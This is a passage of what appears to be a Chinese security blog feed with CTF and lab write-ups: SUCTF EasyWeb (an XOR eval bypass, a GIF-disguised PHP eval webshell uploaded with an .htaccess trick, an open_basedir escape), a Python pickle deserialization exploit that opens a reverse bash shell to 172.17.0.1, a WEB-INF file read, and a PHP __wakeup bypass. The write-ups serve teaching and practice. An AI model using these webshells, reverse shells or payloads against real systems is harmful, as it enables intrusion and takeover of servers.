    <id>http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-04-20T04:32:17.144Z</published>
    <updated>2020-04-20T04:32:17.144Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Apache SSI 远程命令执行漏洞&lt;/strong&gt;&lt;br&gt;链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yuzly/p/11226439.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[SUCTF 2019]EasyWeb</title>
    <link href="http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/"/>
    <id>http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/</id>
    <published>2020-04-19T07:37:26.166Z</published>
    <updated>2020-04-19T07:37:26.166Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb" target="_blank" rel="noopener">题目源码</a></p><pre><code class="php">&lt;?phpfunction get_the_flag(){    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir)){    mkdir($userdir);    }    if(!empty($_FILES[&quot;file&quot;])){        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    }}$hhh = @$_GET[&#39;_&#39;];if (!$hhh){    highlight_file(__FILE__);}if(strlen($hhh)&gt;18){    die(&#39;One inch long, one inch strong!&#39;);}if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>这道题的第一个部分就是bypass这一道道的<code>if</code>语句，要满足所有条件需要</p><ul><li>$hhh的总长度超过18</li><li>需要绕过正则</li><li>需要满足字符串里面出现的字符种类数小于12</li></ul><p>长度的话我们可以构造一个<code>$_GET</code>的变量，然后再取给这个<code>$_GET</code>变量来传递参数就可以了。先用php脚本来看看还剩下哪些字符能够使用</p><pre><code class="php">&lt;?php$ascii=0;for(;$ascii&lt;256;){    if(!preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, chr($ascii))){        echo chr($ascii).&quot;:&quot;.$ascii.&quot;\n&quot;;    }    $ascii++;}    echo &quot;\n&quot;; ?&gt;</code></pre><p>这里面存在了<code>$</code>、<code>%</code>、<code>^</code>这样我们就可以利用字符之间的异或，来构造任意字符来满足我们想要的<code>$_GET</code>变量。</p><pre><code class="php">import stringguess = string.printable_ = []G = []E = []T = []for i in range(256):    for j in range(256):        if ((chr(i) not in guess) &amp; (chr(j) not in guess)):            res = i ^ j            if (chr(res) == &#39;_&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                _.append(result)            if (chr(res) == &#39;G&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                G.append(result)            if (chr(res) == &#39;E&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                E.append(result)            if (chr(res) == &#39;T&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                T.append(result)print(_,end=&quot;\n&quot;)print(G,end=&quot;\n&quot;)print(E,end=&quot;\n&quot;)print(T,end=&quot;\n&quot;)</code></pre><blockquote><p><strong>我们构造的Payload究竟是怎么样的?</strong></p><p><strong>现在已经知道了 Payload 需要由那些不可见字符组成</strong> , 那么 Payload 究竟是怎样的呢?</p><p>题目中有这么一条限制 : <strong>GET方法获取参数的值不能超过 18 个 字符</strong> , 如果想要在 Payload 中执行一个函数 , 格式肯定 <strong>(xxx^xxx)();</strong> 这样的 . 这还必须是无参函数 .</p><p><strong>但即使是无参函数 , 已经使用的字符( 小括号 , 异或符号 , … ) 也已经使用了6个字符 , 函数名又需要两两字符异或计算得到 , 也就是函数名最多有 ((18 - 6) / 2 = 6)个字符 , 而6个字符连个 phpinfo 都运行不了</strong> , 这样肯定是不可行的 .</p><p>直接调用函数好像是不可行的 , 我们需要换一种思路 —— <strong>比如使用全局变量 , 至少” $ “ 符号还是可以使用的</strong> , 介于<strong>题目中对 Payload 长度有限制</strong> , 最短的全局变量为 : <strong>$_GET</strong> . “ <code>$</code> “本身可用 , 而 <strong>_GET</strong> 的形式大概是 : <strong>{xxxx^xxxx}</strong> 这样的 .</p><p>有了全局变量 , 就可以利用 <strong>${} 中的代码是可以执行的特点</strong> ， 把要运行的函数名作为参数来动态执行 . 也就是<code>${x}();</code>这样的形式 , <strong>函数名的值 “ x “ 可以通过全局方法GET来获取</strong></p><p>因此 , 完整的 Payload 应该为 : <strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET<a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF做题笔记/" target="_blank" rel="noopener">x</a>;&amp;x= …</strong></p><p>并且 , <strong>“ _ “ 参数的值为 : ${xxxx^xxxx}(x)(); , 长度为 18 个字符 , 恰好满足题目 strlen() 函数的限制</strong></p><p>该函数限制” _ “参数值最多只能使用<strong>12</strong>个不同的字符 , 而现在 <code>${xxxx^xxxx}{x}();</code> 在不考虑 “ x “ 的情况下已经使用了 <strong>7</strong> 个字符了 , <strong>因此 x 最多只能使用 5 个不同的字符</strong></p><p>根据这个思路 , 可以在合理的情况下构造 Payload 了 , 这里以执行 phpinfo() 为例 , 构造 Payload 如下</p></blockquote><p>这个师傅写的特别的详细，点赞！</p><p>所以最后的payload:</p><pre><code class="php">_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=phpinfo</code></pre><p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" alt="执行payload">执行payload</a></p><p>然后就是第二关了，我们可以看到源码里有一个<code>get_the_flag</code>函数，我们需要利用这个函数来上传一个shell，这个文件需要满足的要求是</p><ul><li>文件扩展名中不能出现<code>ph</code></li><li>并且文件中不能出现`</li><li>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</li></ul><p>不能出现<code>ph</code>的后缀文件，所以我们就不能直接上传<code>php</code>文件。</p><p>再一个我们从前面的phpinfo中得知题目的php的版本为php7，凑巧的是php7已经删除了<code></code>这种语法了，我们只能利用另外的骚操作</p><p>我的做法是，先上传一个文件，要求如下</p><ul><li>有文件头，可以被<code>exif_imagetype()</code>识别出是一个图片</li><li>里面有base64加密的代码</li></ul><pre><code class="php">shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)</code></pre><p>这里面的<code>\x00\x00\x47\x49\x46\x38\x39\x61</code>-&gt;<code>GIF89a</code>是GIF头，<code>b&quot;00&quot;</code>的作用：用来分割头和php代码。目的是防止之后解密base64解密的时候造成错误。</p><p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" alt="shell源码">shell源码</a></p><p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" alt="base64解密">base64解密</a></p><p>但是单单上传一个这个文件是不行的，所以我们需要<code>.htaccess</code>文件来帮助我们让服务器把这个文件解析成php代码，我们才能够真真的利用。</p><pre><code class="python">htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;</code></pre><p>这个后面的路径是上传完第一个shell文件之后产生的。</p><p>贴一下最后的代码</p><pre><code class="python">import requestsimport base64#题目链接url = &quot;http://73706c84-1992-4dba-adbd-b4f109b5b953.node2.buuoj.cn.wetolink.com:82/&quot;payload = &quot;?_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=get_the_flag&quot;shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;#先上传shell文件,在改路径上传.htaccess文件files = {&#39;file&#39;: (&#39;shell.aaa&#39;, shell, &#39;image/gif&#39;)}# files = {&#39;file&#39;: (&#39;.htaccess&#39;, htaccess, &#39;image/gif&#39;)}r = requests.post(url + payload, files=files)print(r.text)</code></pre><p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" alt="操作过程">操作过程</a></p><p>但是有了shell，会发现可以读到当前目录下的文件，但是无法读到根目录下面的flag。</p><p>因为这里还需要绕过<code>open_basedir</code>这里直接给payload了，可以跟着这个<a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">师傅的教程</a>动手做一下实验</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" alt="读根目录文件">读根目录文件</a></p><p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SUCTF-2019-EasyWeb&quot;&gt;&lt;a href=&quot;#SUCTF-2019-EasyWeb&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]EasyWeb&quot;&gt;&lt;/a&gt;[SUCTF 2019]EasyWeb&lt;/h2&gt;&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python反序列化漏洞浅析</title>
    <link href="http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2020-04-09T02:17:58.000Z</published>
    <updated>2020-04-15T02:19:22.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。</p><p>主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。</p><p>引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞</p><p>此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数<strong>wakeup</strong></p><h3 id="0x02-Pickle模块"><a href="#0x02-Pickle模块" class="headerlink" title="0x02 Pickle模块"></a>0x02 Pickle模块</h3><ol><li><p>pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流，这个字符流包含反序列化（从字符流构建对象）所需的所有数据。</p></li><li><p>pickle有两个主要方法。第一个是dump-把对象导入到文件；第二个是load-从文件中加载对象。</p><p>实例</p><pre><code>import picklel1 = [&#39;data1&#39;,&#39;data2&#39;,&#39;data3&#39;, &#39;data4&#39;]file = open(&quot;testfile&quot;,&#39;wb&#39;) # 把l1保存到文件pickle.dump(l1, file)   file.close() ##############################################file = open(&quot;testfile&quot;,&#39;r&#39;)# 从文件中加载保存的对象l2 = pickle.load(file)  print(l2)# 输出: [&#39;data1&#39;, &#39;data2&#39;, &#39;data3&#39;]</code></pre></li><li><p>pickle instructions</p><pre><code>cossystem(S&#39;/bin/sh&#39;tR.</code></pre><blockquote><p>Pickle is a stack language which means that the pickle instructions push data onto the stack or pop data off of the stack and operate on it in some fashion. To understand how the canonical pickle works, we need only understand six pickle instructions:</p><ul><li><code>c</code>: Read to the newline as the module name, <code>module</code>. Read the next line as the object name, <code>object</code>. Push <code>module.object</code> onto the stack.</li><li><code>(</code>: Insert a marker object onto the stack. For our purpose, this is paired with <code>t</code> to produce a tuple.</li><li><code>t</code>: Pop objects off the stack until a <code>(</code> is popped and create a tuple object containing the objects popped (except for the <code>(</code>) in the order they were /pushed/ onto the stack. The tuple is pushed onto the stack</li><li><code>S</code>: Read the string in quotes up to the newline and push it onto the stack.</li><li><code>R</code>: Pop a tuple and a <a href="http://stackoverflow.com/questions/111234/what-is-a-callable-in-python" target="_blank" rel="noopener">callable</a> off the stack and call the callable with the tuple as arguments. Push the result onto the stack.</li><li><code>.</code>: End of the pickle.</li></ul></blockquote></li></ol><ul><li><p>c：读取新的一行作为模块名module，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</p></li><li><p>(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p></li><li><p>t：从堆栈中弹出对象，直到一个“<code>(</code>”被弹出，并创建一个包含弹出对象（除了“<code>(</code>”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p></li><li><p>S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</p></li><li><p>R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</p></li><li><p>.：结束pickle。</p><p>说人话：</p></li><li><p>c：接下来的2行内容类似于，<code>os.system</code>、<code>urllib.unquote</code>是<code>module.object</code>的形式。</p></li><li><p>(：就是左括号</p></li><li><p>t：相当于右扩号</p></li><li><p>S：代表本行后面的内容是<code>String</code>，即字符串。</p></li><li><p>R：执行紧靠自己左边的一个括号对中的内容，即<code>(</code> 和他t直接的内容。</p></li><li><p>.：点号结束pickle。</p></li></ul><h3 id="0x03漏洞分析"><a href="#0x03漏洞分析" class="headerlink" title="0x03漏洞分析"></a>0x03漏洞分析</h3><p>类似于php的wakeup魔术方法，python中的<strong>reduce</strong>，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。</p><p>如果序列化的内容可控，只需要将相应代码写入<strong>reduce</strong>函数中，接收端在反序列化的时候就会自动执行。</p><p>下面是一个简单的示例：</p><p>exp:</p><pre><code>import pickleimport subprocessclass m3lon(object):  def __reduce__(self):    return (subprocess.Popen,((&#39;cmd.exe&#39;,),))pickle.dumps(m3lon())# 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p><p>下面模拟接收端</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" alt="img"></a></p><p>弹出shell！</p><h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p><p>app.py</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>exp.py</p><pre><code>#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;        return (os.system, (s,))e = exp()s = pickle.dumps(e)response = requests.get(&quot;http://172.19.0.2:8000/&quot;, cookies=dict(    user=base64.b64encode(s).decode()))print(response.content)</code></pre><p><strong>分析</strong></p><p>反序列化的内容为user，通过cookie传输(用户可控)，于是pickle的反序列化漏洞便产生了，通过上面的exp可以查看我们生成的payload</p><pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p><p><strong>流程</strong></p><p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" alt="img"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WEB-INF</title>
    <link href="http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-06T08:31:58.000Z</published>
    <updated>2020-04-15T02:18:11.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"><a href="#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码" class="headerlink" title="WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"></a>WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</h2><h4 id="https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java"><a href="#https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java" class="headerlink" title="[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)"></a>[<a href="https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]</a>(<a href="https://buuoj.cn/challenges#[RoarCTF" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF</a> 2019]Easy Java)</h4><h3 id="首先看到一个页面-点击下help看看啥情况。"><a href="#首先看到一个页面-点击下help看看啥情况。" class="headerlink" title="首先看到一个页面,点击下help看看啥情况。"></a>首先看到一个页面,点击下help看看啥情况。</h3><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" alt="img"></a></p><p>发现输出一串</p><pre><code>java.io.FileNotFoundException:{help.docx}</code></pre><p>可能是报错信息，打开Brup截取请求信息</p><pre><code>GET /Download?filename=help.docx HTTP/1.1Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</code></pre><p>通过查询发现要改成POST，得到许多有用信息</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" alt="img"></a></p><pre><code>com.Wm.ctf.DownloadController.doPost</code></pre><p>这个信息跟CTF可能有关,记一下一般有这样都有泄露。</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" alt="img"></a></p><h3 id="因为缺少JAVA项目的开发经验，所以查了大量的资料"><a href="#因为缺少JAVA项目的开发经验，所以查了大量的资料" class="headerlink" title="因为缺少JAVA项目的开发经验，所以查了大量的资料"></a>因为缺少JAVA项目的开发经验，所以查了大量的资料</h3><p>我们访问下WEB-INF/web.xml这个文件</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" alt="img"></a></p><p>得到了个flag的路径!!!!</p><h2 id="插入一个知识点"><a href="#插入一个知识点" class="headerlink" title="插入一个知识点"></a>插入一个知识点</h2><pre><code>WEB-INF主要包含一下文件或目录:/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>base64解码得到flag</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" alt="img"></a></p><h3 id="PS-GET不能读取文件有点懵，没想到居然要改成POST"><a href="#PS-GET不能读取文件有点懵，没想到居然要改成POST" class="headerlink" title="PS: GET不能读取文件有点懵，没想到居然要改成POST"></a>PS: GET不能读取文件有点懵，没想到居然要改成POST</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&quot;&gt;&lt;a href=&quot;#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【极客大挑战2019】PHP</title>
    <link href="http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/"/>
    <id>http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/</id>
    <published>2020-04-02T08:31:58.000Z</published>
    <updated>2020-04-02T08:53:20.743Z</updated>
    
    <content type="html"><![CDATA[<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p><pre><code>&lt;?phpinclude &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>发现了关键代码，考的应该是反序列化漏洞，去看class.php<br>class.php:</p><pre><code>&lt;?php include &#39;flag.php&#39;;  error_reporting(0);  class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>发现关键代码：</p><pre><code>      function __wakeup(){          $this-&gt;username = &#39;guest&#39;;      }</code></pre><p>因此需要对__wakeup()进行绕过。<br>接下来写php代码。</p><p>&lt;?php</p><pre><code>class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username, $password)    {        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$select = new Name(&#39;admin&#39;,100);$res=serialize(@$select);echo $res;</code></pre><p><img src="/img/28.png" alt=""></p><blockquote><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p></blockquote><h1 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h1><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 